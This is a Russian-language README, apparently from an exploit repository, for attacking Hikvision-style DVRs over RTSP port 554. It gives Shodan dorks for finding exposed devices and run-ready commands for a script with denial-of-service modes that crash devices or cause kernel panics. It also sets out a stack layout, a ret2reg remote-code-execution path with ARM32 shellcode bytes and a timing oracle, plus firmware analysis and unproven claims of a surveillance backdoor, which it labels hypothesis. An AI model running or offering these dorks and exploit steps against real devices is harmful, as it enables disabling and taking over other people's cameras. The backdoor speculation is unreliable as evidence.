## Поиск уязвимых устройств (Shodan)

Все найденные уязвимости эксплуатируются через **RTSP на порту 554** — стандартный порт потокового видео, который владельцы DVR открывают наружу для удалённого просмотра камер. Именно он является точкой входа для всех RTSP-векторов ([UA], [TR], [SC], [AC]).

**Почему порт 554 критичен:**
- RTSP парсер работает **без аутентификации** — любой запрос `DESCRIBE` / `SETUP` / `PLAY` обрабатывается до проверки логина
- Устройство выставляет порт 554 наружу намеренно (для мобильных приложений, iVMS, удалённого мониторинга)
- Уязвимый код отрабатывает на этапе **парсинга заголовков** — ещё до любой бизнес-логики
- HTTP-векторы ([HH], [HF]) идут через порт 80, но RTSP-баги тяжелее (kernel panic, CVSS 9.8)

**Дорки для поиска устройств с открытым RTSP:**

```

server:"DVRDVS-Webs" port:554
"Embedded Net DVR" "jQuery 1.7.1" port:554

```

Полный список дорков с фильтрами по странам и брендам → **[docs/shodan-dorks.md](docs/shodan-dorks.md)**

## Быстрый старт

```bash
# Проверка доступности цели и поверхности атаки
python3 exploits/crashbandicoot.py -t <IP> --mode check

# DoS — переполнение стека User-Agent (CVSS 9.8), крэш за ~2.5s
python3 exploits/crashbandicoot.py -t <IP> --mode dos-ua

# DoS — kernel panic через Scale/Accept, полная перезагрузка >90s
python3 exploits/crashbandicoot.py -t <IP> --mode dos-scale
python3 exploits/crashbandicoot.py -t <IP> --mode dos-accept

# Все DoS-векторы последовательно
python3 exploits/crashbandicoot.py -t <IP> --mode all-dos

# RCE-путь: слепой поиск гаджета BX R0 в 15MB mmap-регионе
python3 exploits/crashbandicoot.py -t <IP> --mode scan-bxr0

# Подтверждение RCE после нахождения гаджета
python3 exploits/crashbandicoot.py -t <IP> --mode rce --gadget 0xXXXXXXXX
```

> Требуется Python 3 + Pillow (`pip install Pillow`). Других зависимостей нет.

## Раскладка стека (подтверждена без отладчика)

```
Байты User-Agent:

  ┌──────────────────────────────────────────────────────┐
  │  [0   – 101]  ua_buf      102 байта  dst для strcpy  │  ← сюда ложится шеллкод
  │  [102 – 215]  locals      114 байт   локальные перем │
  │  [216 – 247]  R4–R11       32 байта  сохранённые рег │  ← должен быть kernel-space
  │  [248 – 251]  saved PC      4 байта                  │  ← PC_OFFSET = 248
  └──────────────────────────────────────────────────────┘

Ограничение нулевых байт: strcpy() останавливается на 0x00
→ каждый байт payload включая адрес возврата должен быть ненулевым
```

## Путь к RCE (ret2reg)

```
strcpy(ua_buf, user_agent)
       └─ R0 = ua_buf  (возвращаемое значение по AAPCS)

Перезаписываем saved PC → гаджет BX R0 (0xe12fff10, null-free)
       └─ CPU прыгает на R0 = ua_buf
              └─ исполняется LOOP_SC в ua_buf → бесконечный цикл
                     └─ сервис не перезапускается → оракул DEAD (>20s) → RCE подтверждён
```

```python
# LOOP-маяк — 102 байта, ARM32, 100% null-free
ARM_NOP  = b'\x01\x10\xa0\xe1'   # MOV R1,R1  (0xe1a01001 = kernel space)
ARM_LOOP = b'\xfe\xff\xff\xea'   # B .         (крутится вечно)
LOOP_SC  = ARM_NOP * 24 + ARM_LOOP + b'\x01\x01'
```

**Статус:** оракул работает (HIT=2.5s, 0 ложных DEAD) · проверено 117/938 кандидатов · BX R0 пока не найден

## Оракул таймингов

Единственный канал обратной связи — *время до перезапуска RTSP watchdog'ом* после крэша:

```
< 15s          →  HIT   — крэш в user-space, watchdog перезапустил
> 90s          →  PANIC — kernel panic, полная перезагрузка (Scale / Accept)
> 20s, нет
перезапуска    →  DEAD  — шеллкод крутится → RCE подтверждён
```

Без GDB. Без UART. Без `/proc`. Только секундомер.

## Прошивка

```
digicap.dav  294 МБ  AES-256-ECB  (ключ неизвестен)

Внешний заголовок HK20  108 байт  XOR-обфускация  ключ: публичный (hiktools)
  └─ Внутренний заголовок HK30  16 байт
       └─ Зашифрованное тело  ~280 МБ  AES-256-ECB

Что удалось выяснить без ключа:
  · ECB-режим → 40 065 повторяющихся блоков → восстановлено 626 КБ разметки разделов
  · Фиктивная контрольная сумма (checksum == длина заголовка)
  · Нет HMAC / подписи → тривиальное внедрение бэкдора при наличии ключа
  · Открытый хвост: последние 5 байт не зашифрованы ("ation")
  · Захардкоженный IP 172.9.4.222 в common.js
```

## ⚠️ Захардкоженный корпоративный IP — возможный вектор слежки

В файле `common.js` веб-интерфейса прошивки обнаружена строка:

```javascript
m_szHostName = "172.9.4.222"
```

### Что известно точно

- `172.9.4.222` — **публичный IP-адрес**, не приватный (приватный диапазон: `172.16.0.0/12`, этот IP за его пределами)
- По WHOIS: блок `172.0.0.0/12` принадлежит **AT&T Enterprises, LLC**, Даллас, Техас
- Запросы на устройство с заголовком `Host: 172.9.4.222` возвращают **HTTP `000`** (соединение разрывается без ответа) — вместо стандартного `401 Unauthorized`
- Это означает: веб-сервер **распознаёт** этот адрес и обрабатывает его иначе, чем обычный запрос

### Почему это подозрительно

Поведение `000` вместо `401` — нестандартное. Обычный неавторизованный запрос получает `401`. Специальный silent drop на конкретный Host-заголовок может указывать на:

| Сценарий | Вероятность |
|----------|-------------|
| Забытый dev/staging endpoint разработчика | Высокая |
| Телеметрия или callback на корпоративный сервер | Возможная |
| Скрытый administrative channel через AT&T инфраструктуру | Теоретическая |
| Случайная утечка внутренней топологии сети Hikvision | Высокая |

### Исторический контекст

Это не первый раз. В **2017 году** в прошивках Hikvision IP-камер был найден задокументированный бэкдор (CVE-2017-7921): специальный параметр в URL полностью обходил аутентификацию. Hikvision назвали это «отладочным кодом, случайно оставленным разработчиком». Бэкдор присутствовал в прошивках **с 2014 по 2017 год** — три года.

Компания Hikvision принадлежит **китайскому государству** (CETC — China Electronics Technology Group Corporation) и внесена в санкционный список США (Entity List, 2019) за участие в системе слежки за уйгурами в Синьцзяне.

### Вывод

Захардкоженный публичный IP в клиентском JS-коде, специфическое поведение сервера на этот адрес, зашифрованная прошивка без подписи и документированная история с бэкдорами складываются в картину, которую сложно объяснить только халтурным кодингом.

> Миллионы DVR/NVR по всему миру — в банках, офисах, жилых домах — работают на этой прошивке 24/7. Устройство, которое «следит за безопасностью», само может быть инструментом слежки.

*Данный раздел содержит гипотезы, основанные на технических наблюдениях. Прямых доказательств намеренного backdoor в исследованной прошивке не получено.*
